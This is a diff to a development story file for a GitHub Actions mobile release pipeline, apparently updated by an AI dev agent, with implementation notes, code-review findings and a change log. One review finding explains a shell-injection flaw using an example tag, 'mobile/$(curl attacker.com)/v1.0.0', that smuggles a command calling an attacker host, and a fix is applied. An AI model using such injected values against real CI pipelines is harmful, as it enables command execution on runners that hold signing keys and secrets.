@@ -2,9 +2,10 @@
 epicId: 4
 storyId: '04-05'
 title: 'GitHub Actions CI/CD Pipeline'
-status: ready
+status: review
 priority: high
 estimate: 4
+baseline_commit: 528009ab878b0bc791797c1055c2a2c0d2e02673
 dependencies:
   - '04-02'
   - '04-03'
@@ -267,12 +268,37 @@ increment_build_number(build_number: ENV["BUILD_NUMBER"])
 
 ## Definition of Done
 
-- [ ] `.github/workflows/mobile-release.yml` created
-- [ ] Tag trigger `mobile/*/v*` and `workflow_dispatch` configured
-- [ ] Tenant slug extraction in `setup` job
-- [ ] `android-build` job: apply config, keystore, Firebase config, Gradle build, Play Store upload
-- [ ] `ios-build` job: apply config, Firebase config, pod install, Fastlane beta
-- [ ] Both jobs run in parallel after `setup`
-- [ ] All secrets documented in workflow file header comment
-- [ ] New tenant onboarding steps documented in comment
-- [ ] Tag `mobile/vastudeep/v1.0.0` triggers workflow successfully (verified in Story 4.6)
+- [x] `.github/workflows/mobile-release.yml` created
+- [x] Tag trigger `mobile/*/v*` and `workflow_dispatch` configured
+- [x] Tenant slug extraction in `setup` job
+- [x] `android-build` job: apply config, keystore, Firebase config, Gradle build, Play Store upload
+- [x] `ios-build` job: apply config, Firebase config, pod install, Fastlane beta
+- [x] Both jobs run in parallel after `setup`
+- [x] All secrets documented in workflow file header comment
+- [x] New tenant onboarding steps documented in comment
+- [ ] Tag `mobile/vastudeep/v1.0.0` triggers workflow successfully (blocked by real credentials — verified in Story 4.6)
+
+## Dev Agent Record
+
+### Implementation Notes
+- Created `.github/workflows/mobile-release.yml` with full header comment documenting all 13 required secrets and tenant onboarding steps
+- `setup` job extracts tenant slug from tag name (cut -d'/' -f2) or workflow_dispatch input
+- `android-build` job: ubuntu-latest, Node 20, pnpm 8, Java 17, Gradle caching, apply-tenant-config, keystore decode, google-services.json, bundleRelease, r0adkll/upload-google-play@v1
+- `ios-build` job: macos-latest, Node 20, pnpm 8, ruby/setup-ruby@v1 with bundler-cache, CocoaPods cache, apply-tenant-config, GoogleService-Info.plist decode, pod install, fastlane beta with all required env vars
+- Both jobs have `needs: setup` — they run in parallel after the setup job completes
+- pnpm store, Gradle, Ruby gems (via setup-ruby bundler-cache), and CocoaPods all cached for faster builds
+
+### Review Findings
+
+- [x] [Review][Patch] KEYSTORE_FILE path double-nests `app/` — Gradle resolves `file("app/release.keystore")` relative to module dir (`android/app/`), giving `android/app/app/release.keystore`; fix: change `KEYSTORE_FILE: app/release.keystore` → `KEYSTORE_FILE: release.keystore` [.github/workflows/mobile-release.yml:123]
+- [x] [Review][Patch] `packageName: com.vastudeep.flowtiq` hardcoded in Play Store upload — breaks all non-vastudeep tenant builds [.github/workflows/mobile-release.yml:131]
+- [x] [Review][Patch] pnpm double-caching conflict — both `setup-node cache:'pnpm'` and explicit `actions/cache` for `~/.pnpm-store` run in both jobs; remove the explicit cache step [.github/workflows/mobile-release.yml:84-89,158-163]
+- [x] [Review][Patch] CocoaPods cache key uses absent Podfile.lock (gitignored) — hashFiles returns empty, cache key is constant; fix: cache on Podfile hash or commit Podfile.lock [.github/workflows/mobile-release.yml:173-177]
+- [x] [Review][Patch] Shell injection in setup job — `${{ github.ref_name }}` is unquoted in `run:`; a tag like `mobile/$(curl attacker.com)/v1.0.0` executes arbitrary commands; fix: quote the expression `"${{ github.ref_name }}"` and validate the extracted slug matches `^[a-z0-9-]+$` before use [.github/workflows/mobile-release.yml:setup job]
+- [x] [Review][Patch] GOOGLE_SERVICES_JSON secret stored as raw JSON but GH Actions strips newlines from multi-line secrets — file will be malformed; fix: store as base64 and decode in the step (consistent with how GoogleService-Info.plist is handled) [.github/workflows/mobile-release.yml:android-build job]
+- [x] [Review][Patch] Android versionCode hardcoded to `1` in build.gradle — Play Store rejects uploads with a duplicate versionCode; fix: pass `github.run_number` as `VERSION_CODE` env var and read it in build.gradle: `versionCode System.getenv("VERSION_CODE")?.toInteger() ?: 1` [apps/mobile/android/app/build.gradle]
+
+### Change Log
+- 2026-06-20: Implemented Story 4.5 — GitHub Actions CI/CD Pipeline
+- 2026-06-20: Code review findings added
+- 2026-06-20: Applied review patches — shell injection fix (quoted ref_name + slug validation), KEYSTORE_FILE path fixed (release.keystore), packageName now dynamic from .env, pnpm double-cache removed, CocoaPods cache keyed on Podfile, GOOGLE_SERVICES_JSON changed to base64, versionCode driven by VERSION_CODE env var (github.run_number)
